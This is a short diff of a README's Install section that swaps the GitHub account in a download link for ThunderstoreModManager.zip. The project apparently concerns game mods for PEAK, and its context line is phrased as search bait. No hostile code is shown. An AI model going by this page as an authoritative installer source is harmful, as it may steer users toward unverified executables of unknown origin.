@@ -10,7 +10,7 @@ As **peak thunderstore** and **thunderstore peak** searches surge with PEAK's mo
 
 
 ## Install
-[Download `ThunderstoreModManager.zip`](https://github.com/thunderstoremm/Thunderstore-Mod-Manager/releases/download/v3.2.18/ThunderstoreModManager.zip)
+[Download `ThunderstoreModManager.zip`](https://github.com/Thunderstore-Mod-Manager/Thunderstore-Mod-Manager/releases/download/v3.2.18/ThunderstoreModManager.zip)
 ---
 
 
